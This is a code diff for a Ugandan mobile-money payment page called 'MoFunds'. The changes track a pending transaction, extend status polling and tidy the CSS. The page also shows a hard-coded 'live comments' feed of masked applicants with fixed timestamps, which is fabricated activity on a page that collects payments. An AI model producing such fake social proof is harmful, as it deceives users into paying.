@@ -167,24 +167,11 @@ position:absolute;
 top:-35px;
 animation:flowerFall linear forwards;
 }
-
 @keyframes flowerFall{
-0%{
-transform:translateY(-40px) rotate(0deg);
-opacity:1;
+0%{transform:translateY(-40px) rotate(0deg);opacity:1;}
+100%{transform:translateY(230px) rotate(360deg);opacity:0;}
 }
-100%{
-transform:translateY(230px) rotate(360deg);
-opacity:0;
-}
-}
-
-.footer{
-text-align:center;
-padding:14px;
-font-size:12px;
-color:#666;
-}
+.footer{text-align:center;padding:14px;font-size:12px;color:#666;}
 </style>
 </head>
 
@@ -248,7 +235,6 @@ color:#666;
 <small id="liveTime2">12s ago</small>
 </div>
 </div>
-
 </div>
 
 <div class="footer">© 2026 MoFunds Uganda</div>
@@ -259,7 +245,7 @@ color:#666;
 <script>
 "use strict";
 
-const BACKEND_URL = "https://momo-funds-202.onrender.com";
+const BACKEND_URL="https://momo-funds-202.onrender.com";
 
 const applicant=
 localStorage.getItem("fullName")||
@@ -293,6 +279,7 @@ const payBtn=document.getElementById("payBtn");
 const msg=document.getElementById("stkMessage");
 
 let selectedProvider="mtn";
+let currentTransaction=localStorage.getItem("currentTransaction")||null;
 
 document.querySelectorAll(".provider").forEach(btn=>{
 btn.addEventListener("click",()=>{
@@ -334,6 +321,13 @@ setMessage("Enter a valid Uganda phone number.","error");
 return;
 }
 
+if(currentTransaction){
+setLoading(true,"Waiting...");
+setMessage("A payment is already pending. Checking its status...");
+await checkPayment(currentTransaction);
+return;
+}
+
 localStorage.setItem("phoneNumber",phone);
 
 setLoading(true,"Processing...");
@@ -369,6 +363,9 @@ if(!transactionId){
 throw new Error("OptimaPay did not return a transaction ID.");
 }
 
+currentTransaction=transactionId;
+localStorage.setItem("currentTransaction",transactionId);
+
 setLoading(true,"Waiting...");
 setMessage(`Payment request sent to ${phone}. Enter your Mobile Money PIN.`);
 
@@ -384,7 +381,7 @@ async function checkPayment(transactionId){
 
 const start=Date.now();
 
-while(Date.now()-start<120000){
+while(Date.now()-start<180000){
 
 try{
 
@@ -392,26 +389,36 @@ const response=await fetch(`${BACKEND_URL}/api/status/${transactionId}`);
 const result=await readJson(response);
 
 const payment=result.data||result;
-const status=String(payment.status||"").toUpperCase();
+const status=String(payment.status||result.status||"").toUpperCase();
 
 if(status==="PENDING"){
-setMessage(`Payment request sent to ${phoneEl.value}. Waiting for confirmation...`);
+setLoading(true,"Waiting...");
+setMessage(`Payment request sent to ${phoneEl.value}. Waiting for MTN confirmation...`);
 }
 
-if(["SUCCESS","SUCCESSFUL"].includes(status)){
+if(["SUCCESS","SUCCESSFUL","COMPLETED"].includes(status)){
+
+localStorage.removeItem("currentTransaction");
+currentTransaction=null;
+
 setMessage("Payment successful. Redirecting...","success");
 setLoading(true,"Confirmed");
+
 setTimeout(()=>window.location.href="delivery.html",1000);
 return;
 }
 
-if(["FAILED","CANCELLED"].includes(status)){
+if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+
+localStorage.removeItem("currentTransaction");
+currentTransaction=null;
+
 throw new Error("Payment "+status.toLowerCase()+".");
 }
 
 }catch(error){
 
-if(/failed|cancelled/i.test(error.message)){
+if(/failed|cancelled|expired/i.test(error.message)){
 setMessage(error.message,"error");
 setLoading(false,"💳 Continue Payment");
 return;
@@ -423,13 +430,13 @@ await new Promise(r=>setTimeout(r,5000));
 
 }
 
-setMessage("Payment confirmation timed out.","error");
-setLoading(false,"💳 Continue Payment");
+setMessage("Payment is still pending. Please wait for the MTN prompt or check again shortly.","error");
+setLoading(false,"Check Payment Status");
 }
 
 payBtn.addEventListener("click",payNow);
 
-/* FLOWERS MOVING DOWN CONTINUOUSLY */
+/* FLOWERS */
 
 const rainContainer=document.getElementById("flowerRain");
 const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
@@ -447,7 +454,7 @@ setTimeout(()=>flower.remove(),4500);
 
 setInterval(createRainFlower,180);
 
-/* LIVE COMMENTS EVERY 5 SECONDS */
+/* LIVE COMMENTS */
 
 const livePeople=[
 ["Amina","07*****37","Application submitted","5s ago"],
